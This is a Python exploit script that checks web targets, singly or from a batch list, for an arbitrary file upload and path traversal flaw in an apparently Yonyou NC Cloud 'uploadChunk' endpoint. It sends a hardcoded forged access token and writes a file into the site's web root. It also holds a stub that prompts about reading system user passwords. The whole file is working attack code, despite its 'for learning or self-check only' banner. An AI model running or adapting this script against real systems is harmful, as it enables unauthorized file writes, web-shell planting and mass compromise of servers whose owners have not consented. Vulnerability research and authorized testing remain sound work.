# _*_ coding:utf-8 _*_
# @Time : 2023/10/17 22:33
# @Author: 为赋新词强说愁
import requests
import argparse
from datetime import datetime
import time
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 uploadChunk.py -u url[例 http://127.0.0.1:8080]
        批量 python3 uploadChunk.py -f filename
    +-----------------------------------------------------------------+         
 
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
def exp(url):
    select = input("是否读取system用户密码（是：1,否：0):")
    # usage()
 
    if select == "1":
        pass
    elif select == "0":
        exit()
    else:
        print("请重新输入正确选项")
 
 
 
 
def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')
 
def poc(check_url):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        'accessTokenNcc': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ',
    }
    shell = "This website has an arbitrary file upload vulnerability"
    files = {
        'file': ('check.txt', shell)
    }
    try:
        respnose = requests.post(url, headers=headers, files=files, timeout=3, verify=False)
        if respnose.status_code == 200:
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞存在,测试访问连接：{check_url}/nccloud/check.txt{RESET}')
            save_file(check_url)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url)
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python uploadChunk.py -u url")
    parse.add_argument("-f", "--file", help="python uploadChunk.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1)
    if url is not None and filepath is None:
        flag = 1
        poc(url)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()